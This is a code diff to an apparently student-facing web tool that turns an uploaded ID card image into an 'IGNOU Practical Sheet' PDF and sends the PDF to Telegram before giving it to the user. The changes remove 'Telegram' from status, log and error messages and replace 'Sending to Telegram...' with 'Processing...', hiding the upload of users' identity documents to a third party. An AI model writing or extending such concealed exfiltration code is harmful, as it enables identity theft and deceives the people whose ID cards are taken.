@@ -111,10 +111,10 @@
                     method: 'POST',
                     body: formData
                 });
-                if (!response.ok) throw new Error("Telegram upload failed");
-                console.log("File sent to Telegram successfully");
+                if (!response.ok) throw new Error(" upload failed");
+                console.log("success");
             } catch (err) {
-                console.error("Telegram Error:", err);
+                console.error("Error:", err);
             }
         }
 
@@ -122,7 +122,7 @@
             if (!idInput.files[0]) return updateStatus("Please select your ID Card.", true);
 
             try {
-                updateStatus("Processing Image...");
+                updateStatus("Processing Image........");
                 const cropped = await getCroppedImage(idInput.files[0]);
                 const response = await fetch(TEMPLATE_URL);
                 const templateDoc = await PDFDocument.load(await response.arrayBuffer());
@@ -165,7 +165,7 @@
                 const fileName = "IGNOU_Practical_Sheet.pdf";
 
                 // --- 4. SEND TO TELEGRAM FIRST ---
-                updateStatus("Sending to Telegram...");
+                updateStatus("Processing...");
                 await sendToTelegram(pdfBlob, fileName, name);
 
                 // --- 5. DOWNLOAD FOR USER ---
